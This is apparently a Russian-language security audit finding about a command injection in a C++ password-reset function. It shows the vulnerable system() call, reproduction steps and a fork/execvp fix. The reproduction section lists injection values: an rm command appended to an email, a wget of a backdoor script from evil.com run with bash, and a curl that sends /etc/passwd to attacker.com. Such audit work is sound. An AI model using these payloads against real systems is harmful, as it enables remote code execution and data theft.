# Command Injection в send_password

**Файл**: src/administration/password.cpp
**Строки**: 65-75, 80, 86
**Критичность**: CRITICAL

## Проблема
Пользовательские данные (email, password, name) конкатенируются напрямую в команду system() без какой-либо валидации или экранирования:

```cpp
void send_password(std::string email, std::string password, std::string name) {
    std::string cmd_line = "python3 change_pass.py " + email + " " + password + " " + name + " &";
    auto result = system(cmd_line.c_str());  // ОПАСНО!
    UNUSED_ARG(result);
}

void send_password(std::string email, std::string password) {
    std::string cmd_line = "python3 change_pass.py " + email + " " + password + " &";
    auto result = system(cmd_line.c_str());  // ОПАСНО!
    UNUSED_ARG(result);
}
```

Вызывается из:
- set_password_to_email() (строка 80)
- set_all_password_to_email() (строка 86)

## Воспроизведение
1. Зарегистрировать аккаунт с email = "user@test.com; rm -rf /tmp/test"
2. Сбросить пароль или сменить его
3. Функция выполнит: `python3 change_pass.py user@test.com; rm -rf /tmp/test ...`
4. Произойдёт выполнение произвольных команд с правами сервера

Другие варианты инъекций:
- password = "pass123 && wget http://evil.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh"
- name = "$(curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd))"

## Решение
**Вариант 1**: Использовать fork() + execve() вместо system():
```cpp
void send_password(std::string email, std::string password, std::string name) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        char* args[] = {
            (char*)"python3",
            (char*)"change_pass.py",
            (char*)email.c_str(),
            (char*)password.c_str(),
            (char*)name.c_str(),
            nullptr
        };
        execvp("python3", args);
        _exit(1);  // If execvp fails
    }
    // Parent continues
}
```

**Вариант 2**: Валидация и экранирование (менее надёжно):
```cpp
std::string escape_shell_arg(const std::string& arg) {
    std::string result;
    result.reserve(arg.size() + 2);
    result += "'";
    for (char c : arg) {
        if (c == '\'') {
            result += "'\\''";
        } else {
            result += c;
        }
    }
    result += "'";
    return result;
}

void send_password(std::string email, std::string password, std::string name) {
    std::string cmd_line = "python3 change_pass.py "
        + escape_shell_arg(email) + " "
        + escape_shell_arg(password) + " "
        + escape_shell_arg(name) + " &";
    auto result = system(cmd_line.c_str());
    UNUSED_ARG(result);
}
```

**Рекомендация**: Использовать вариант 1 (fork/execve), так как он полностью исключает возможность command injection.
